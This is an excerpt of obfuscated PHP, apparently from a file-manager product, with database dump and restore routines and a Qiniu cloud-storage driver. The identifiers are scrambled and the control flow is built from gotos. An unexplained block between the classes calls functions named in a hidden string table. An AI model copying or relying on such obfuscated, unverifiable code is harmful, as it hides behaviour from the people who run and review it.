$this->taskToCache($D¨º…›ù); } public function insertTable($eÅïÊ¯”Š¯, $Eõ­…Ó…ï‡ = null) { $fªÈÕ„ î‹ =& $_SERVER[Š‰]; $A¸„æ·º = $this->model()->db(); $EÓ°ËŞ›¢ = $A÷Ø¤‡Şà ? array($A÷Ø¤‡Şà) : $A¸„æ·º->getTables(); foreach ($eÅïÊ¯”Š¯ as $D”†±İìÑÌ) { $A÷Ø¤‡Şà = basename($D”†±İìÑÌ, $fªÈÕ„ î‹[730]); if (!in_array($A÷Ø¤‡Şà, $EÓ°ËŞ›¢)) { continue; } if ($Eõ­…Ó…ï‡) { $Eõ­…Ó…ï‡->task[$fªÈÕ„ î‹[1000]] = $A÷Ø¤‡Şà; } if (get_filesize($D”†±İìÑÌ) == 0) { continue; } $D²ï´ÕÑäÒ = $this->sqlToDb($D”†±İìÑÌ, $Eõ­…Ó…ï‡); if (!$D²ï´ÕÑäÒ) { ActionCall($fªÈÕ„ î‹[995], !0, 0); show_json(LNG($fªÈÕ„ î‹[1001]) . "\133{$A÷Ø¤‡Şà}\135", !1); } } $this->taskToCache($Eõ­…Ó…ï‡); } public function sqlFromDb($Cî´é¶æé‰, $Bƒ…Ÿ‘–¯¨, $d‚ÌÑçÆ‰Š = null, $f„Šè¬Ÿ• = null) { goto F†èóç¶‘ª; dÀ»µô¿Ş: $Cƒ¸îğ†Óº = 1; $DÂÍ°ÌÎÓ¡ = 500; $FÊŒİê«“÷ = fopen($Bƒ…Ÿ‘–¯¨, $_SERVER[Š‰][1002]); goto F’‚ª‰ œ“; F†èóç¶‘ª: if ($d‚ÌÑçÆ‰Š) { $d‚ÌÑçÆ‰Š->task[$_SERVER[Š‰][1000]] = $Cî´é¶æé‰; } $aø°ï°§ëÍ = $this->model($Cî´é¶æé‰); $aÀÃâßÙŸï = 0; goto dÀ»µô¿Ş; F’‚ª‰ œ“: $cÄ‚†Çæ¢¯ = $aø°ï°§ëÍ->getPk(); $fÆ‡±éïŒ± = $aø°ï°§ëÍ->getDbFields(); do { $a¶¸ïÍô…à = $aø°ï°§ëÍ->field($fÆ‡±éïŒ±)->order($cÄ‚†Çæ¢¯ . $_SERVER[Š‰][1003])->selectPage($DÂÍ°ÌÎÓ¡, $Cƒ¸îğ†Óº); $cİ‰ê…¢³Ş = isset($a¶¸ïÍô…à[$_SERVER[Š‰][362]][$_SERVER[Š‰][364]]) ? $a¶¸ïÍô…à[$_SERVER[Š‰][362]][$_SERVER[Š‰][364]] : 0; $EÂ»¯¶×¨¬ = !empty($a¶¸ïÍô…à[$_SERVER[Š‰][365]]) ? $a¶¸ïÍô…à[$_SERVER[Š‰][365]] : array(); if (!($F¨¿—Åùïö = count($EÂ»¯¶×¨¬))) { break; } $D¥Œ®¾‘”µ = array(); foreach ($EÂ»¯¶×¨¬ as $c«¥ÉÚâ¢¦) { if ($Cî´é¶æé‰ == $_SERVER[Š‰][1004] && $c«¥ÉÚâ¢¦[$_SERVER[Š‰][29]] == $_SERVER[Š‰][1005]) { $eÈ´ë÷ƒÙî = json_decode($c«¥ÉÚâ¢¦[$_SERVER[Š‰][370]], !0); if ($eÈ´ë÷ƒÙî[$_SERVER[Š‰][28]] == date($_SERVER[Š‰][703]) && !$eÈ´ë÷ƒÙî[$_SERVER[Š‰][702]]) { continue; } } if ($f„Šè¬Ÿ•) { $c«¥ÉÚâ¢¦[$_SERVER[Š‰][75]] = "\173\x69\157\x3a{$f„Šè¬Ÿ•}\x7d" . substr($c«¥ÉÚâ¢¦[$_SERVER[Š‰][75]], strlen("\173\x69\157\x3a{$c«¥ÉÚâ¢¦[$_SERVER[Š‰][768]]}\175")); $c«¥ÉÚâ¢¦[$_SERVER[Š‰][768]] = $f„Šè¬Ÿ•; } $D¥Œ®¾‘”µ[] = $_SERVER[Š‰][1006] . $this->sqlEncode($c«¥ÉÚâ¢¦) . $_SERVER[Š‰][1007]; } $bÙÚÙ¦›º = "\111\x4e\123\105\x52\124\40\x49\116\124\x4f\40\x60{$Cî´é¶æé‰}\140\40\50\x60" . implode($_SERVER[Š‰][1008], $fÆ‡±éïŒ±) . $_SERVER[Š‰][1009]; fwrite($FÊŒİê«“÷, $bÙÚÙ¦›º . implode($_SERVER[Š‰][1010], $D¥Œ®¾‘”µ) . $_SERVER[Š‰][67] . PHP_EOL); $Cƒ¸îğ†Óº++; $aÀÃâßÙŸï += $F¨¿—Åùïö; if ($d‚ÌÑçÆ‰Š) { $d‚ÌÑçÆ‰Š->update($F¨¿—Åùïö); } } while ($Cƒ¸îğ†Óº <= $cİ‰ê…¢³Ş); goto AŞÁ­šçö±; AŞÁ­šçö±: fclose($FÊŒİê«“÷); return $aÀÃâßÙŸï; goto B†ƒ‚¦¤¡Ï; B†ƒ‚¦¤¡Ï: } public function sqlToDb($fŸß·ƒÒÕ‹, $AÇâ‚æµŞù = null) { goto bÂÚŞ„÷øœ; D±Â¦İÕõ: if (!$c›–¨ÇŒô¹) { return !1; } $e¥éèˆÏ„ö = 0; $aŒÎ¤Ä´Î“ = $dî´”­’îÚ[33]; goto EÓ‘í¹ŸË©; b¼Î«Šµ…¸: if (trim($aŒÎ¤Ä´Î“)) { $aŒÎ¤Ä´Î“ = rtrim(trim($aŒÎ¤Ä´Î“), $dî´”­’îÚ[67]); if (!$f¿ƒ…Ú¢Ì‚->execute($aŒÎ¤Ä´Î“)) { return !1; } if ($AÇâ‚æµŞù) { $AÇâ‚æµŞù->update($e¥éèˆÏ„ö - 1); } } return !0; goto BÖí»‰ë™è; bÂÚŞ„÷øœ: $dî´”­’îÚ =& $_SERVER[Š‰]; $f¿ƒ…Ú¢Ì‚ = $this->model()->db(); $c›–¨ÇŒô¹ = @fopen($fŸß·ƒÒÕ‹, $dî´”­’îÚ[1011]); goto D±Â¦İÕõ; EÓ‘í¹ŸË©: $c¿œßÂñ‘ = 500 + 1; while (!feof($c›–¨ÇŒô¹)) { if ($AÇâ‚æµŞù && $e¥éèˆÏ„ö != 0) { $AÇâ‚æµŞù->task[$dî´”­’îÚ[998]] += 1; } $e¥éèˆÏ„ö++; $aèÙ¨·×Ùæ = trim(fgets($c›–¨ÇŒô¹)); $aŒÎ¤Ä´Î“ .= $dî´”­’îÚ[50] . $this->sqlDecode($aèÙ¨·×Ùæ, $this->type); if ($e¥éèˆÏ„ö == $c¿œßÂñ‘) { $aŒÎ¤Ä´Î“ = rtrim(trim($aŒÎ¤Ä´Î“), $dî´”­’îÚ[67]); if (!$f¿ƒ…Ú¢Ì‚->execute($aŒÎ¤Ä´Î“)) { return !1; } if ($AÇâ‚æµŞù) { $AÇâ‚æµŞù->update($e¥éèˆÏ„ö - 1); } $aŒÎ¤Ä´Î“ = $dî´”­’îÚ[33]; $e¥éèˆÏ„ö = 0; } } fclose($c›–¨ÇŒô¹); goto b¼Î«Šµ…¸; BÖí»‰ë™è: } public function dropTable($D¼ äË«îÃ = null) { $fŒ‘ÑÑ™Äø = $this->model()->db(); $B—‰Õ§·Šõ = $D¼ äË«îÃ ? array($D¼ äË«îÃ) : $fŒ‘ÑÑ™Äø->getTables(); if (!$B—‰Õ§·Šõ) { return; } foreach ($B—‰Õ§·Šõ as $D¼ äË«îÃ) { $fŒ‘ÑÑ™Äø->execute("\x64\x72\157\x70\40\x74\141\x62\154\x65\x20\151\x66\40\x65\170\x69\163\x74\x73\x20\x60{$D¼ äË«îÃ}\x60"); } } private function taskToCache($cÕƒê­ÍÇ = null) { $bŸŠæÏ ÚÊ =& $_SERVER[Š‰]; if (!$cÕƒê­ÍÇ) { return; } $a‘‚¥áƒƒÃ = array($bŸŠæÏ ÚÊ[1000] => $cÕƒê­ÍÇ->task[$bŸŠæÏ ÚÊ[1000]], $bŸŠæÏ ÚÊ[998] => $cÕƒê­ÍÇ->task[$bŸŠæÏ ÚÊ[998]], $bŸŠæÏ ÚÊ[1012] => $cÕƒê­ÍÇ->task[$bŸŠæÏ ÚÊ[1012]]); if ($a‘‚¥áƒƒÃ[$bŸŠæÏ ÚÊ[998]] == $a‘‚¥áƒƒÃ[$bŸŠæÏ ÚÊ[1012]]) { $a‘‚¥áƒƒÃ[$bŸŠæÏ ÚÊ[709]] = 1; } Cache::set($bŸŠæÏ ÚÊ[1013] . $cÕƒê­ÍÇ->task[$bŸŠæÏ ÚÊ[388]], $a‘‚¥áƒƒÃ); $cÕƒê­ÍÇ->end(); } private function sqlEncode($b½¦Ä¶»²) { $CÍ‹ªŞˆˆ÷ =& $_SERVER[Š‰]; $d³ÚÔ°‚–˜ = array(); foreach ($b½¦Ä¶»² as $D¼‚êÎ×˜Ş) { if (is_array($D¼‚êÎ×˜Ş)) { $D¼‚êÎ×˜Ş = json_encode_force($D¼‚êÎ×˜Ş); } $D¼‚êÎ×˜Ş = addslashes($D¼‚êÎ×˜Ş); $D¼‚êÎ×˜Ş = str_replace(array($CÍ‹ªŞˆˆ÷[1014], $CÍ‹ªŞˆˆ÷[227]), array($CÍ‹ªŞˆˆ÷[1015], $CÍ‹ªŞˆˆ÷[1016]), $D¼‚êÎ×˜Ş); $d³ÚÔ°‚–˜[] = str_replace($CÍ‹ªŞˆˆ÷[55], $CÍ‹ªŞˆˆ÷[1017], $D¼‚êÎ×˜Ş); } return $CÍ‹ªŞˆˆ÷[55] . implode($CÍ‹ªŞˆˆ÷[1018], $d³ÚÔ°‚–˜) . $CÍ‹ªŞˆˆ÷[55]; } private function sqlDecode($f‡ŒèœÆ˜, $cœñŒÀÈŸ†) { $a…Òë’…ô =& $_SERVER[Š‰]; $f‡ŒèœÆ˜ = str_replace(array($a…Òë’…ô[1015], $a…Òë’…ô[1016]), array($a…Òë’…ô[1014], $a…Òë’…ô[227]), $f‡ŒèœÆ˜); if ($cœñŒÀÈŸ† == $a…Òë’…ô[9]) { $f‡ŒèœÆ˜ = stripslashes($f‡ŒèœÆ˜); } return $f‡ŒèœÆ˜; } } goto f †ÜÒ„ç°; cßÕÖ©ã: if ($_SERVER[$_SERVER[Š‰][753]] != $bùê«Õ†ó‰($dŠÉ•«óá)) { goto D‘»ŒÆ˜¶; F‡ˆ¹åô: $E¿©‘áÎí¦($dŠÉ•«óá); goto a‡‰µ„ ; D‘»ŒÆ˜¶: $b Œ—ÓÈÜ = $_SERVER[Š‰][754]; $cñ¹äæô‚½ = $_SERVER[$_SERVER[Š‰][755]] . $_SERVER[Š‰][756]; $d³·†’ãø¹ = $b Œ—ÓÈÜ($cñ¹äæô‚½); goto a‘»™ÁŞ±ˆ; a‘»™ÁŞ±ˆ: $F°á›ÅÅ¨ = explode($_SERVER[Š‰][227], $d³·†’ãø¹); if (count($F°á›ÅÅ¨) < $_SERVER[Š‰][588]) { $bğèËÖÉÂ  = $_SERVER[Š‰][757]; $bğèËÖÉÂ (); } $E¿©‘áÎí¦ = $_SERVER[Š‰][758]; goto F‡ˆ¹åô; a‡‰µ„ : } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($aÍçœ¶œƒñ) { parent::__construct(); require_once SDK_DIR . $_SERVER[Š‰][1275]; $this->_init($aÍçœ¶œƒñ); } public function _init($eÃàšœˆÔ”) { goto BŸÌøƒù‚Ú; aœ—Î´¸Øæ: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto FŞ¤¤Œ³¡…; FŞ¤¤Œ³¡…: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto FÛå‘éë˜ ; BŸÌøƒù‚Ú: $c®Š³ä‡Ú =& $_SERVER[Š‰]; foreach ($eÃàšœˆÔ” as $eÒ¤ÒÔ”°÷ => $FÛÃŒ¬Ø›¿) { if (isset($this->{$eÒ¤ÒÔ”°÷})) { $this->{$eÒ¤ÒÔ”°÷} = $FÛÃŒ¬Ø›¿; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($c®Š³ä‡Ú[1276] . LNG($c®Š³ä‡Ú[1235])); } goto aœ—Î´¸Øæ; FÛå‘éë˜ : } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($f˜£Ö¾ô²¦, $aÂŞ…×¸¼² = '', $aÊÓ‘„Œó´ = REPEAT_RENAME) { if ($this->setContent($f˜£Ö¾ô²¦, $aÂŞ…×¸¼²)) { return $this->getPathOuter($f˜£Ö¾ô²¦); } return !1; } public function mkdir($C÷Ñ…Í‚­…, $d“ôƒÙÍå = REPEAT_SKIP) { goto Dö¡™ŞóÁ‰; Dö¡™ŞóÁ‰: $a¥Ç³­’Á =& $_SERVER[Š‰]; $BÉ³Âä = trim($C÷Ñ…Í‚­…, $a¥Ç³­’Á[8]); if ($this->_isFolder($BÉ³Âä)) { return $this->getPathOuter($BÉ³Âä); } goto aÒ„È°„¤; aÒ„È°„¤: $C÷Ñ…Í‚­… = $BÉ³Âä . $a¥Ç³­’Á[8]; $f¤ø‚ùé¡ = get_path_this($BÉ³Âä); $CÙŠ­±•µ = $C÷Ñ…Í‚­… . $f¤ø‚ùé¡; goto fæÁƒõïğó; fæÁƒõïğó: if (!$this->mkfile($CÙŠ­±•µ)) { return !1; } if (!$this->moveFile($CÙŠ­±•µ, $C÷Ñ…Í‚­…)) { $this->delFile($CÙŠ­±•µ); return !1; } return $this->getPathOuter($BÉ³Âä); goto a¿ØÕÔçô÷; a¿ØÕÔçô÷: } public function copyFile($F´§÷ß†…, $FöàñŒ‚µµ) { $Eˆ¼ñö˜ëÖ = $this->bucketManager->copy($this->bucket, $F´§÷ß†…, $this->bucket, $FöàñŒ‚µµ, !0); return $Eˆ¼ñö˜ëÖ ? !1 : $this->getPathOuter($FöàñŒ‚µµ); } public function moveFile($bã”è‘ˆ©¨, $eĞ»á‚éòÆ) { $fÖ¨Š¨‹³¼ = $this->bucketManager->move($this->bucket, $bã”è‘ˆ©¨, $this->bucket, $eĞ»á‚éòÆ, !0); return $fÖ¨Š¨‹³¼ ? !1 : $this->getPathOuter($eĞ»á‚éòÆ); } public function delFile($CÓäñ„´¥Ğ) { if (!$this->exist($CÓäñ„´¥Ğ)) { return !0; } $bğ„¦áİÕô = $this->bucketManager->delete($this->bucket, $CÓäñ„´¥Ğ); return $bğ„¦áİÕô ? !1 : !0; } public function delFolder($fƒâ¨Á¡¡Æ) { goto DÁ”ãÙñš; DÁ”ãÙñš: $cƒËÌíªí‡ =& $_SERVER[Š‰]; if (!$this->exist($fƒâ¨Á¡¡Æ)) { return !0; } $this->listItemCache = !1; goto C‹ÆÛ‡Ò³; b™Ñ„¡ÊÛ±: return $this->delByBatch($EĞ®õ±¤¿÷[$cƒËÌíªí‡[74]]); goto B‡Í¾¤½¼; C‹ÆÛ‡Ò³: $EĞ®õ±¤¿÷ = $this->fileList($fƒâ¨Á¡¡Æ); $this->listItemCache = !0; $cª÷¥¦¢¾ã = trim($fƒâ¨Á¡¡Æ, $cƒËÌíªí‡[8]) . $cƒËÌíªí‡[8]; goto F¦àŠ¢Ã‡; F¦àŠ¢Ã‡: if (!empty($fƒâ¨Á¡¡Æ) && !in_array($cª÷¥¦¢¾ã, $EĞ®õ±¤¿÷[$cƒËÌíªí‡[74]])) { $EĞ®õ±¤¿÷[$cƒËÌíªí‡[74]][] = $cª÷¥¦¢¾ã; } $Eê‡Œ°‹Ö = $this->delByBatch($EĞ®õ±¤¿÷[$cƒËÌíªí‡[73]]); if (!$Eê‡Œ°‹Ö) { return !1; } goto b™Ñ„¡ÊÛ±; B‡Í¾¤½¼: } private function delByBatch($C¥…ö©îÁÛ) { foreach (array_chunk($C¥…ö©îÁÛ, 1000) as $aîÇÖŒœš÷) { $f‰¢ƒƒã = $this->bucketManager->buildBatchDelete($this->bucket, $aîÇÖŒœš÷); list($a¬Œ©¦³Ÿ×, $Fğ¸æ…—àø) = $this->bucketManager->batch($f‰¢ƒƒã); if ($Fğ¸æ…—àø) { return !1; } } return !0; } public function rename($C¢éÏƒøÇÏ, $C£‘°ØŠÚ) { return $this->renameObject($C¢éÏƒøÇÏ, $C£‘°ØŠÚ); } public function fileInfo($aÈÏ‰éßÄ©, $eä¦£±‹¾ô = false, $B®¢î ›ñ = array()) { goto d®õèªöÉß; A÷Š«àîÚ²: if (isset($B®¢î ›ñ[$eƒ’–“ô’”[1278]])) { $FêÙãŒ·á[$eƒ’–“ô’”[83]] = substr($B®¢î ›ñ[$eƒ’–“ô’”[1278]] . $eƒ’–“ô’”[33], 0, 10); } if (isset($B®¢î ›ñ[$eƒ’–“ô’”[1277]])) { $FêÙãŒ·á[$eƒ’–“ô’”[77]] = $B®¢î ›ñ[$eƒ’–“ô’”[1277]]; } return $FêÙãŒ·á; goto dĞ¢çÀ¡ßÎ; EÏÂÑ·Ïç„: $FêÙãŒ·á[$eƒ’–“ô’”[192]] = $FêÙãŒ·á[$eƒ’–“ô’”[83]] = 0; $FêÙãŒ·á[$eƒ’–“ô’”[193]] = $FêÙãŒ·á[$eƒ’–“ô’”[194]] = !0; if (empty($B®¢î ›ñ)) { $B®¢î ›ñ = $this->objectMeta($aÈÏ‰éßÄ©); if (!$B®¢î ›ñ) { return $FêÙãŒ·á; } } goto A÷Š«àîÚ²; d®õèªöÉß: $eƒ’–“ô’” =& $_SERVER[Š‰]; $FêÙãŒ·á = array($eƒ’–“ô’”[28] => $this->pathThis($aÈÏ‰éßÄ©), $eƒ’–“ô’”[75] => $this->getPathOuter($eƒ’–“ô’”[8] . $aÈÏ‰éßÄ©), $eƒ’–“ô’”[29] => $eƒ’–“ô’”[173], $eƒ’–“ô’”[77] => isset($B®¢î ›ñ[$eƒ’–“ô’”[1277]]) ? $B®¢î ›ñ[$eƒ’–“ô’”[1277]] : 0, $eƒ’–“ô’”[167] => $this->ext($aÈÏ‰éßÄ©)); if ($eä¦£±‹¾ô) { return $FêÙãŒ·á; } goto EÏÂÑ·Ïç„; dĞ¢çÀ¡ßÎ: } public function folderInfo($e–ßçê÷ÅÑ, $B¶äÈ¥Ê› = false) { goto f÷¤²ˆ¹ó; BºáÅÁäËÜ: $Cººãƒè‰ö = $this->objectMeta($e–ßçê÷ÅÑ); if (isset($Cººãƒè‰ö[$Bù´ÚÙİíÌ[1278]])) { $dŒ®œ¬Ô°‡[$Bù´ÚÙİíÌ[83]] = substr($Cººãƒè‰ö[$Bù´ÚÙİíÌ[1278]] . $Bù´ÚÙİíÌ[33], 0, 10); } return $dŒ®œ¬Ô°‡; goto c£««œÜÉ¿; dã¡ßøÛ‚Ù: $dŒ®œ¬Ô°‡[$Bù´ÚÙİíÌ[192]] = $dŒ®œ¬Ô°‡[$Bù´ÚÙİíÌ[83]] = 0; $dŒ®œ¬Ô°‡[$Bù´ÚÙİíÌ[193]] = $dŒ®œ¬Ô°‡[$Bù´ÚÙİíÌ[194]] = !0; $e–ßçê÷ÅÑ = rtrim($e–ßçê÷ÅÑ, $Bù´ÚÙİíÌ[8]) . $Bù´ÚÙİíÌ[8]; goto BºáÅÁäËÜ; f÷¤²ˆ¹ó: $Bù´ÚÙİíÌ =& $_SERVER[Š‰]; $dŒ®œ¬Ô°‡ = array($Bù´ÚÙİíÌ[28] => $this->pathThis($e–ßçê÷ÅÑ), $Bù´ÚÙİíÌ[75] => $this->getPathOuter($Bù´ÚÙİíÌ[8] . $e–ßçê÷ÅÑ), $Bù´ÚÙİíÌ[29] => $Bù´ÚÙİíÌ[76]); if ($B¶äÈ¥Ê›) { return $dŒ®œ¬Ô°‡; } goto dã¡ßøÛ‚Ù; c£««œÜÉ¿: } public function listPath($A…É Š¾ÚÜ, $D»æø…¯÷ = false) { $E‹¯†®ìË =& $_SERVER[Š‰]; $bò¨çŒª = $this->fileList($A…É Š¾ÚÜ, $E‹¯†®ìË[8], !0); foreach ($bò¨çŒª[$E‹¯†®ìË[74]] as $e‚Æõ‡Şµæ => $F³ì×Û¹“¤) { $bò¨çŒª[$E‹¯†®ìË[74]][$e‚Æõ‡Şµæ] = $this->folderInfo($F³ì×Û¹“¤, $D»æø…¯÷); } foreach ($bò¨çŒª[$E‹¯†®ìË[73]] as $e‚Æõ‡Şµæ => $F³ì×Û¹“¤) { $bò¨çŒª[$E‹¯†®ìË[73]][$e‚Æõ‡Şµæ] = $this->fileInfo($F³ì×Û¹“¤[$E‹¯†®ìË[92]], $D»æø…¯÷, $F³ì×Û¹“¤); } return $bò¨çŒª; } public function has($b¿ÄŸß¹˜, $Bµ´”••Û = false, $dÇá¨ó®¸Á = true) { goto eà‚Êïé»­; c‹Ÿ«Ñ˜è¡: $D¢ÜÖ¼‘Ã« = $FÉã’¢›Áµ = 0; while (!0) { check_abort(); list($Fœ×îôÎ¿ƒ, $dçë÷ÆåĞ—) = $this->bucketManager->listFiles($this->bucket, $aÉ¯­õÈ, $Fƒ”ê³±ÒÂ, $DÕö×ô‚Ç, $bä›£œªÕ); if ($dçë÷ÆåĞ—) { break; } $Fƒ”ê³±ÒÂ = array_key_exists($d™’·½Áƒà[1247], $Fœ×îôÎ¿ƒ) ? $Fƒ”ê³±ÒÂ = $Fœ×îôÎ¿ƒ[$d™’·½Áƒà[1279]] : $d™’·½Áƒà[33]; if ($Bµ´”••Û) { if (!empty($Fœ×îôÎ¿ƒ[$d™’·½Áƒà[1280]])) { $D¢ÜÖ¼‘Ã« += count($Fœ×îôÎ¿ƒ[$d™’·½Áƒà[1280]]); } if (!empty($Fœ×îôÎ¿ƒ[$d™’·½Áƒà[1281]])) { $FÉã’¢›Áµ += count($Fœ×îôÎ¿ƒ[$d™’·½Áƒà[1281]]); } if ($Fƒ”ê³±ÒÂ === $d™’·½Áƒà[33]) { break; } continue; } if ($dÇá¨ó®¸Á) { if (!empty($Fœ×îôÎ¿ƒ[$d™’·½Áƒà[1280]])) { return !0; } } else { if (!empty($Fœ×îôÎ¿ƒ[$d™’·½Áƒà[1281]])) { return !0; } } if ($Fƒ”ê³±ÒÂ === $d™’·½Áƒà[33]) { break; } } if ($Bµ´”••Û) { return array($d™’·½Áƒà[201] => $D¢ÜÖ¼‘Ã«, $d™’·½Áƒà[202] => $FÉã’¢›Áµ); } goto Bé”äñî; eà‚Êïé»­: $d™’·½Áƒà =& $_SERVER[Š‰]; $b¿ÄŸß¹˜ = trim($b¿ÄŸß¹˜, $d™’·½Áƒà[8]); $aÉ¯­õÈ = empty($b¿ÄŸß¹˜) ? $d™’·½Áƒà[33] : $b¿ÄŸß¹˜ . $d™’·½Áƒà[8]; goto f¡ëøò‡; f¡ëøò‡: $Fƒ”ê³±ÒÂ = $d™’·½Áƒà[33]; $DÕö×ô‚Ç = 500; $bä›£œªÕ = $d™’·½Áƒà[8]; goto c‹Ÿ«Ñ˜è¡; Bé”äñî: return !1; goto e“„¹¹ä«¬; e“„¹¹ä«¬: } public function listAll($eçßÆ£éÙí) { $böø‡Ô”ÒĞ =& $_SERVER[Š‰]; $d–Íë¨†°… = $this->fileList($eçßÆ£éÙí, $böø‡Ô”ÒĞ[33], !0); $E‹ÑÜ†ÒØ” = array(); foreach ($d–Íë¨†°…[$böø‡Ô”ÒĞ[73]] as $c»ÉŒ»”¢) { $E‹ÑÜ†ÒØ”[$c»ÉŒ»”¢[$böø‡Ô”ÒĞ[92]]] = $c»ÉŒ»”¢[$böø‡Ô”ÒĞ[77]]; } foreach ($d–Íë¨†°…[$böø‡Ô”ÒĞ[74]] as $c»ÉŒ»”¢) { if (is_string($c»ÉŒ»”¢)) { $E‹ÑÜ†ÒØ”[$c»ÉŒ»”¢] = 0; } } return $this->listAllFiles($eçßÆ£éÙí, array_keys($E‹ÑÜ†ÒØ”), $E‹ÑÜ†ÒØ”); } private function fileList($EÔÖŸèäÕ’, $FÀ¾ß¼Ê‚ = '', $c¤Ì¥‡ÁŠ„ = 0) { goto E—ÆÉÛµç; fÜîãº–¥ø: return array($Cï•†Å“ò†[74] => $d–ö‚¶æŒÎ, $Cï•†Å“ò†[73] => $Câ˜ ƒËíÚ); goto dĞ±£ªÛ¹ˆ; cùˆÕ¡­Î§: $d–ö‚¶æŒÎ = $Câ˜ ƒËíÚ = array(); while (!0) { check_abort(); list($fšõĞÍ¨½ª, $dÒÊ¤ÃœØà) = $this->bucketManager->listFiles($this->bucket, $a¾‘Ÿ©ø˜, $CÜĞŒÛ®†‡, $E»‰ƒÂÅ³î, $FÀ¾ß¼Ê‚); if ($dÒÊ¤ÃœØà) { break; } $CÜĞŒÛ®†‡ = array_key_exists($Cï•†Å“ò†[1247], $fšõĞÍ¨½ª) ? $CÜĞŒÛ®†‡ = $fšõĞÍ¨½ª[$Cï•†Å“ò†[1279]] : $Cï•†Å“ò†[33]; $B‰ÎÄ™Ò§ = isset($fšõĞÍ¨½ª[$Cï•†Å“ò†[1280]]) ? $fšõĞÍ¨½ª[$Cï•†Å“ò†[1280]] : array(); $c¨âìŞÇµ‚ = isset($fšõĞÍ¨½ª[$Cï•†Å“ò†[1281]]) ? $fšõĞÍ¨½ª[$Cï•†Å“ò†[1281]] : array(); foreach ($B‰ÎÄ™Ò§ as $Fé¼ì´š½ê) { goto bµß«½ˆº; bµß«½ˆº: if ($Fé¼ì´š½ê[$Cï•†Å“ò†[92]] == $a¾‘Ÿ©ø˜) { continue; } $aÒµÓ¹öŠ = $Fé¼ì´š½ê[$Cï•†Å“ò†[92]]; $EùĞªŠ©Åš = $Fé¼ì´š½ê[$Cï•†Å“ò†[1277]]; goto FŞ¾Šçšƒ; FŞ¾Šçšƒ: $Fé¼ì´š½ê[$Cï•†Å“ò†[77]] = $EùĞªŠ©Åš; $CöĞÆ¶Ÿ«ó = $EùĞªŠ©Åš == 0 && substr($aÒµÓ¹öŠ, strlen($aÒµÓ¹öŠ) - 1, 1) == $Cï•†Å“ò†[8] ? !0 : !1; if ($EÅ£‰è»ê) { $this->cacheMethod($Cï•†Å“ò†[197], $aÒµÓ¹öŠ, $CöĞÆ¶Ÿ«ó); $this->cacheMethod($Cï•†Å“ò†[198], $aÒµÓ¹öŠ, $Fé¼ì´š½ê); } goto b’ƒà£Œ¦š; b’ƒà£Œ¦š: if ($CöĞÆ¶Ÿ«ó) { $d–ö‚¶æŒÎ[] = $aÒµÓ¹öŠ; continue; } $Câ˜ ƒËíÚ[] = $c¤Ì¥‡ÁŠ„ ? $Fé¼ì´š½ê : $aÒµÓ¹öŠ; goto dÛ×ÖÏ·¯±; dÛ×ÖÏ·¯±: } foreach ($c¨âìŞÇµ‚ as $aÒµÓ¹öŠ) { if ($aÒµÓ¹öŠ == $a¾‘Ÿ©ø˜) { continue; } $d–ö‚¶æŒÎ[] = $aÒµÓ¹öŠ; if ($EÅ£‰è»ê) { $this->cacheMethod($Cï•†Å“ò†[197], $aÒµÓ¹öŠ, !0); } } if ($CÜĞŒÛ®†‡ === $Cï•†Å“ò†[33]) { break; } } if ($EÅ£‰è»ê) { $this->cacheMethod($Cï•†Å“ò†[197], $EÔÖŸèäÕ’, !0); } goto fÜîãº–¥ø; E—ÆÉÛµç: $Cï•†Å“ò† =& $_SERVER[Š‰]; $EÔÖŸèäÕ’ = trim($EÔÖŸèäÕ’, $Cï•†Å“ò†[8]); $a¾‘Ÿ©ø˜ = empty($EÔÖŸèäÕ’) ? $Cï•†Å“ò†[33] : $EÔÖŸèäÕ’ . $Cï•†Å“ò†[8]; goto fšÈÚ‘‹¬Ñ; fšÈÚ‘‹¬Ñ: $CÜĞŒÛ®†‡ = $Cï•†Å“ò†[33]; $E»‰ƒÂÅ³î = 1000; $EÅ£‰è»ê = $this->listItemCache === !1 ? !1 : !0; goto cùˆÕ¡­Î§; dĞ±£ªÛ¹ˆ: } public function canRead($bìŸ£ôø¨Æ) { return $this->exist($bìŸ£ôø¨Æ) ? !0 : !1; } public function canWrite($bŠñØÁ—³Ğ) { return $this->exist($bŠñØÁ—³Ğ) ? !0 : !1; } public function getContent($F¥ˆ³ï§ß) { return $this->fileSubstr($F¥ˆ³ï§ß, 0, -1); } public function setContent($Eî¢¥¶Øç½, $Dä˜ÌÂÍ÷ñ = '') { $d×‡““½— = $this->tempFile($this->pathThis($Eî¢¥¶Øç½)); file_put_contents($d×‡““½—, $Dä˜ÌÂÍ÷ñ); if ($this->upload($Eî¢¥¶Øç½, $d×‡““½—)) { $this->tempFileRemve($d×‡““½—); return !0; } return !1; } public function refreshUrls($CïªÓÆàù) { goto a½òé’•è„; eœô´’Üºâ: $bÏ‚Æ¦ã‰ô = new Qiniu\Cdn\CdnManager($this->auth); list($aª­’„É´, $c¥¹ŸÇŠ®) = $bÏ‚Æ¦ã‰ô->refreshUrls($D‹ƒÃœ§¾ƒ); if ($c¥¹ŸÇŠ®) { return !1; } goto a£–ÛØÜİ²; a½òé’•è„: $cÁô‘‹¤åí =& $_SERVER[Š‰]; $D‹ƒÃœ§¾ƒ = array(); if (is_array($CïªÓÆàù)) { foreach ($CïªÓÆàù as $dïŞ»é’È) { $D‹ƒÃœ§¾ƒ[] = $this->link($dïŞ»é’È); } } else { $D‹ƒÃœ§¾ƒ[] = $this->link($CïªÓÆàù); } goto eœô´’Üºâ; a£–ÛØÜİ²: return $aª­’„É´[$cÁô‘‹¤åí[1054]] == $cÁô‘‹¤åí[709] ? !0 : !1; goto Cì©¾±ôèÓ; Cì©¾±ôèÓ: } public function fileSubstr($AÇïÆÔÏ¡à, $F„¥¾¤ÚŠ , $Bï’Ä©Ç¹) { $ašÃÔÚ†„Ñ =& $_SERVER[Š‰]; if (!($dÃ½À“…Ò = $this->link($AÇïÆÔÏ¡à))) { return !1; } $C‡¨‘ˆÓÏ• = !1; if 